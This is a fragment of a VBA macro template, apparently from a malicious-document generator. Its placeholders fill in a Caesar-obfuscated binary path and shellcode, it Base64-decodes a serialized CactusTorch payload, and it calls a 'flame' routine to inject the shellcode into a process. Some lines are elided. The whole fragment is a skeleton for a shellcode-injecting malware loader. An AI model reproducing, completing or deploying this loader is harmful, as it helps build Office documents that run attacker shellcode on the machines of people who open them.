Public ${varBinary} As String
Public ${varShellcode} As String
...
Sub Init()
    ...
    ${varBinary} = ""
    ${varBinary} = ${funcInvertCaesar}(${caesarKey},"${binary}")
    ${varShellcode} = ""
    ${varShellcode} = LoadTemplates("shellcode")
End Sub
...
Function Run()
    ...
    Dim bytes() As Byte
    bytes = Base64Decode(LoadTemplates("cactusTorch_serialized.bin"))
    ...
    o.flame ${varBinary}, ${varShellcode}
